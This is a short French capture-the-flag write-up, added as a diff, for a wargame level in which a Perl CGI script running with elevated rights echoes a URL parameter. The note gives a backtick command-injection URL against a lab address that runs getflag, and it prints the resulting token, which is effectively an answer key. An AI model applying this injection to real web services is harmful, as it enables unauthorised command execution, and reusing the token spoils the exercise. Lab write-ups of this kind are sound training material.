@@ -1,0 +1,5 @@
+Level04
+Sur le home un script perl est present avec, les droits de flag04, qui communique en html sur le port 4747 et print le retour de x;
+donc sur un navigateur on lui lance une commande get de type:
+http://192.168.85.137:4747/?x=`getflag`
+Et il nous affiche gentiment: Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
